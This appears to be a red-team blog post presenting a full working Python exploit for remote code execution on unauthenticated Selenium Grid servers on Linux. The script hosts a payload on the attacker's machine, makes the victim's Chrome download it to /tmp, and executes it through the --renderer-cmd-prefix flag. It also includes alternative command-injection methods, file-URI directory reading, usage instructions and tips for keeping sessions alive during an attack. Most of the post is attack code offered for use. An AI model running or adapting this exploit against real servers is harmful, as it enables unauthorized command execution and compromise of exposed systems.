---
title: Selenium Grid RCE - Chrome on Linux
date: 2022-09-12T13:41:09-07:00
draft: false
description: How to get RCE on exposed Selenium Grid servers for linux
---

Selenium is an awesome tool that you can use to completely drive a web browser through a nice and simple python interface. There's lots of cool possibilities to use this for red teaming, however the simplest is that it can provide a trivial vector for RCE when unauthenticated.

There are several publicly available exploits for Selenium Grid, however during testing I found that most of them were either low quality or do not work on unix environments due to the executable filesystem permission. Let's skip to the good part:

```python
import socketserver
import threading
import time
import argparse
import posixpath
import urllib
import os
import signal
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.chrome.options import Options
from http.server import HTTPServer, BaseHTTPRequestHandler

# parsers
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True,
   help="IP Selenium is running on")
parser.add_argument("-p", "--port", required=True,
   help="Port selenium is running on")
parser.add_argument("-e", "--exploit", required=True,
   help="Path to exploit")
parser.add_argument("-w", "--web", required=True,
   help="IP of machine hosting exploit (Should be attackers machine)")
args = parser.parse_args()


# attacker info
payload_name = args.exploit
attack_url = args.web
attack_full = f"http://{attack_url}:8000/{payload_name}"
attack_dl = f"http://{attack_url}:8000/download"

# victim info
vic_url = args.url
vic_port = args.port
vic_full = f"http://{vic_url}:{vic_port}/wd/hub"

# download path (Where chrome downloads the binary. needs to be writeable)
download_dir = "/tmp"
full_exploit = f"{download_dir}/{payload_name}"
download = f"<a href='{attack_full}' id='raw-url'>Download</a>"

driver = None

def alarm_handler(signum, frame):
    raise Exception("Time!")

def start_timer(seconds):
    signal.signal(signal.SIGALRM, alarm_handler)
    signal.alarm(seconds)

def convert(driver, element_to_check_for_dict):
    if type(element_to_check_for_dict) is dict:
        first_element_value = list(element_to_check_for_dict.values())[0]
        element_to_check_for_dict = driver.create_web_element(element_id=first_element_value)
    return element_to_check_for_dict

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _set_headers_b(self):
        self.send_response(200)
        self.send_header("Content-type", "binary/octet-stream")
        self.end_headers()

    def _html(self, message):
        """This just generates an HTML document that includes `message`
        in the body. Override, or re-write this do do more interesting stuff.
        """
        content = f"<html><body><h1>{message}</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        
        if self.path == '/download':
            self._set_headers()
            self.wfile.write(self._html(download))
        if self.path == f"/{payload_name}":
            self._set_headers_b()
            with open(args.exploit, 'rb') as file: 
                self.wfile.write(file.read()) # Read the file and send the contents 

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        # Doesn't do anything with posted data
        self._set_headers()
        self.wfile.write(self._html("POST!"))

def run(server_class=HTTPServer, handler_class=S, addr="0.0.0.0", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd server on {addr}:{port}")
    httpd.serve_forever()

def run_web_background():
    run()

def thread_it():
    # do some stuff
    download_thread = threading.Thread(target=run_web_background)
    download_thread.start()

def selenium_dl_payload():
    # Phase 1 download reverse shell
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--no-sandbox")
    preferences = {"download.default_directory": download_dir ,
               	"directory_upgrade": True,
               	"safebrowsing.enabled": True }
    chrome_options.add_experimental_option("prefs", preferences)
    driver = webdriver.Remote(command_executor=vic_full, options=chrome_options)
    # Selenium flow
    driver.get(attack_dl)
    print("GET request, waiting for page load")
    time.sleep(10)
    print(driver.page_source)
    dl = driver.find_element("id", "raw-url")
    dl = convert(driver, dl)
    dl.click()
    print("clicked, waiting 10 seconds for download")
    time.sleep(10)
    print("download should be finished")
    driver.quit()

def get_list(directory):
    print(f"listing {directory}")
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=DesiredCapabilities.CHROME)
    driver.get(f"file://{directory}")
    print(driver.page_source)
    driver.quit()

def get_source(url):
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=DesiredCapabilities.CHROME)
    driver.get(url)
    print(driver.page_source)
    driver.quit()

def binary_location_method(command, args):
    # This method attempts to use the binary_location method to perform command injection
    print('executing...')
    option = Options()
    option.binary_location = command
    for i in args:
        option.add_argument(i)
    driver = webdriver.Remote(command_executor=vic_full, options=option)
    driver.get('http://google.com/')
    driver.quit()

def executable_method(path):
    # This method attempts to use the executable_path to start your binary directly
    driver = webdriver.Remote(command_executor=vic_full, executable_path=path)
    driver.get('https://google.com/')
    driver.quit()

def prefix_attack(payload):
    # This method attempts to use utility-cmd-prefix to perform command injection
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--utility-and-browser")
    chrome_options.add_argument("--utility-cmd-prefix="+payload)
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=DesiredCapabilities.CHROME, options=chrome_options)
    print("This will not be reached")
    driver.get("http://google.com")
    print("executed")
    driver.quit()

def renderer_attack(payload):
    # This method attempts to use renderer-cmd-prefix to perform command injection
    # For some reason this is the most reliable method
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--renderer-cmd-prefix="+payload)
    driver = webdriver.Remote(command_executor=vic_full, desired_capabilities=DesiredCapabilities.CHROME, options=chrome_options)
    print("This will not be reached")
    driver.get("http://google.com")
    print("executed")
    driver.quit()

def exploit():
    # Execute our payload
    start_timer(10)
    try:
        renderer_attack(f"bash {full_exploit}")
    except Exception:
        pass
    print("Ding! Check your exploit :)")

def main():
    thread_it()
    time.sleep(5)
    print("starting download")
    selenium_dl_payload()
    print("starting exploit")
    exploit()

#if __name__ == '__main__':
#    main()
```

# Basic RCE Usage

```shell
python3 -i selenium-poc.py -u <target-url> -p <target-port> -w <your-address> -e <bash-exploit-script>
main()
```

First of all, much of this script is stolen from a publicly available exploit by another author. This original script however did not work correctly when targetting linux hosts in practice, so I expanded upon it until it did. I have added in multiple methods that I attempted to use to get this exploit working on linux targets and defined the webdriver as a global, which is very important if anything goes wrong during exploitation. The addtional exploit methods should come in handy to anyone stuck in a similar situation in the future.

The webdriver being defined as a global is important because any time an exception is thrown by the local Selenium API wrapper you could lose the handle to the session. If you lose the handle to the session you generally have to wait several hours until your target automatically times out the session. If you attempt to start a new session during this time, it will simply get added to a queue, fortunately these tend to time out faster if the original client isn't still waiting to pick up its session. Running our exploit in the python interpreter and setting driver to be a global solves this problem, as we can always call driver.quit() to gracefully close the last session and try another attack.

Another consideration is that chrome will not overwrite previous downloads with the same name, which means that you will need to use a unique exploit name each time you download another script to the disk. If you do accidentally download the same file name twice, it will instead write your exploit to `<filename> (2)` If your script is too big and cannot complete the download within 10 seconds, you will see a crdownload file within the download directory.

# Additional capabilities

You can call `get_list(<path>)` to list directories and read out files for read or debugging purposes. This is actually just a basic request to chrome file URI, but it comes in handy.

# My test setup

In my experience docker deployments of this app seem to be pretty common, which is unfortunate from an attacker's perspective but RCE is still RCE. It also makes it easy to deploy Selenium and test this out.

For my test instance, I have used this [docker-compose file](https://github.com/SeleniumHQ/docker-selenium/blob/trunk/docker-compose-v3.yml) that starts up a few different nodes from the [official docker-selenium repository](https://github.com/SeleniumHQ/docker-selenium).

```yml
# To execute this docker-compose yml file use `docker-compose -f docker-compose-v3.yml up`
# Add the `-d` flag at the end for detached execution
# To stop the execution, hit Ctrl+C, and then `docker-compose -f docker-compose-v3.yml down`
version: "3"
services:
  chrome:
    image: selenium/node-chrome:4.4.0-20220831
    shm_size: 2gb
    depends_on:
      - selenium-hub
    environment:
      - SE_EVENT_BUS_HOST=selenium-hub
      - SE_EVENT_BUS_PUBLISH_PORT=4442
      - SE_EVENT_BUS_SUBSCRIBE_PORT=4443

  edge:
    image: selenium/node-edge:4.4.0-20220831
    shm_size: 2gb
    depends_on:
      - selenium-hub
    environment:
      - SE_EVENT_BUS_HOST=selenium-hub
      - SE_EVENT_BUS_PUBLISH_PORT=4442
      - SE_EVENT_BUS_SUBSCRIBE_PORT=4443

  firefox:
    image: selenium/node-firefox:4.4.0-20220831
    shm_size: 2gb
    depends_on:
      - selenium-hub
    environment:
      - SE_EVENT_BUS_HOST=selenium-hub
      - SE_EVENT_BUS_PUBLISH_PORT=4442
      - SE_EVENT_BUS_SUBSCRIBE_PORT=4443

  selenium-hub:
    image: selenium/hub:4.4.0-20220831
    container_name: selenium-hub
    ports:
      - "4442:4442"
      - "4443:4443"
      - "4444:4444"
```

